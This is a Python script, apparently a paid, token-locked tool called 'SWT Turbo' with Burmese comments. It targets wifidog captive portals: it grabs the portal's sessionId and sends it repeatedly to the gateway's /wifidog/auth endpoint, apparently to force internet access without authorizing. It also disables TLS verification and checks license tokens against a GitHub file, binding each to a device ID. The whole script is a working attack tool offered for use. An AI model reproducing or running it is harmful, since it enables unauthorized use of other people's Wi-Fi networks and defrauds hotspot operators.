import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil
import json
import uuid
from urllib.parse import urlparse, parse_qs, urljoin

# SSL Warning ပိတ်ရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
TOKEN_URL = "https://raw.githubusercontent.com/demoppal/demo/refs/heads/main/token.txt"
LOCAL_DB = ".sys_config.json" # Device ပေါ်မှာ သိမ်းမယ့် Database
PING_THREADS = 5
PING_INTERVAL = 0.1

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_device_id():
    """ဖုန်းရဲ့ Unique ID ကို ထုတ်ယူခြင်း"""
    return str(uuid.getnode())

def load_db():
    """Local Database ကို ဖတ်ခြင်း"""
    if os.path.exists(LOCAL_DB):
        try:
            with open(LOCAL_DB, "r") as f:
                return json.load(f)
        except: return {"used_tokens": {}, "expired_tokens": []}
    return {"used_tokens": {}, "expired_tokens": []}

def save_db(data):
    """Local Database ကို သိမ်းဆည်းခြင်း"""
    with open(LOCAL_DB, "w") as f:
        json.dump(data, f)

def show_banner():
    clear_screen()
    print("""
    \033[1;32m
    ##########################################
    #              SWT  TURBO                #
    #    [ DEVICE LOCK & AUTO EXPIRE ]       #
    ##########################################
    \033[0m
    """)

def get_data_usage():
    try:
        net_io = psutil.net_io_counters()
        return (net_io.bytes_sent + net_io.bytes_recv) / (1024 * 1024)
    except: return 0

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def get_valid_token():
    show_banner()
    user_token = input("\033[1;33m[*] Enter Token Number:\033[0m\n> ").strip()
    
    db = load_db()
    my_id = get_device_id()

    # ၁။ Expire ဖြစ်ပြီးသားလား စစ်မည်
    if user_token in db["expired_tokens"]:
        print("\n\033[1;31m[!] Error: This token is permanently EXPIRED on this device.\033[0m")
        sys.exit()

    # ၂။ တခြား Device မှာ Lock ဖြစ်နေလား စစ်မည်
    if user_token in db["used_tokens"]:
        if db["used_tokens"][user_token] != my_id:
            print("\n\033[1;31m[!] Error: Token already locked to another device!\033[0m")
            sys.exit()

    try:
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(TOKEN_URL, headers=headers, timeout=10)
        
        for entry in response.text.splitlines():
            if entry.startswith(f"{user_token}:"):
                _, t_time = entry.split(":")
                
                # Token ကို ဒီ Device ID နဲ့ Binding လုပ်လိုက်ပြီ
                if user_token not in db["used_tokens"]:
                    db["used_tokens"][user_token] = my_id
                    save_db(db)
                    
                print(f"\033[1;32m[+] Device Verified. Duration: {t_time} minutes.\033[0m")
                return user_token, int(t_time)
        
        print("\n\033[1;31m[!] Invalid Token Number!\033[0m")
        sys.exit()
    except Exception as e:
        print(f"Connection Error: {e}"); sys.exit()

def start_process():
    token_name, token_minutes = get_valid_token()
    token_limit = time.time() + (token_minutes * 60)
    
    print(f"\n\033[1;33m[1] Start SWT Turbo\n[0] Exit\033[0m")
    if input("> ") != '1': sys.exit()

    show_banner()
    start_time = time.time()
    start_data = get_data_usage()

    while True:
        # အချိန်ကုန်မကုန် စစ်ဆေးခြင်း
        if time.time() > token_limit:
            db = load_db()
            if token_name not in db["expired_tokens"]:
                db["expired_tokens"].append(token_name) # Expire စာရင်းသွင်းသည်
                save_db(db)
            print("\n\n\033[1;31m[!] Time Expired! This token is now BANNED.\033[0m")
            sys.exit()

        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    elapsed = time.time() - start_time
                    h, m = divmod(int(elapsed // 60), 60); s = int(elapsed % 60)
                    rem_m = int((token_limit - time.time()) // 60)
                    rem_s = int((token_limit - time.time()) % 60)
                    
                    data_used = get_data_usage() - start_data
                    print(f"\r\033[1;36m[*] Up: {h:02d}:{m:02d}:{s:02d} | Used: {data_used:.2f}MB | Rem: {rem_m:02d}:{rem_s:02d} | Status: OK\033[0m", end='', flush=True)
                    time.sleep(5)
                    continue
            
            # Captive Portal Detection
            portal_url = r.url
            parsed = urlparse(portal_url)
            r1 = session.get(portal_url, verify=False, timeout=10)
            path = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path.group(1)) if path else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                gw_addr = parse_qs(parsed.query).get('gw_address', ['192.168.60.1'])[0]
                gw_port = parse_qs(parsed.query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
                
                while check_real_internet() and time.time() < token_limit:
                    time.sleep(5)
        except:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        print("\n\nStopped.")
        sys.exit()

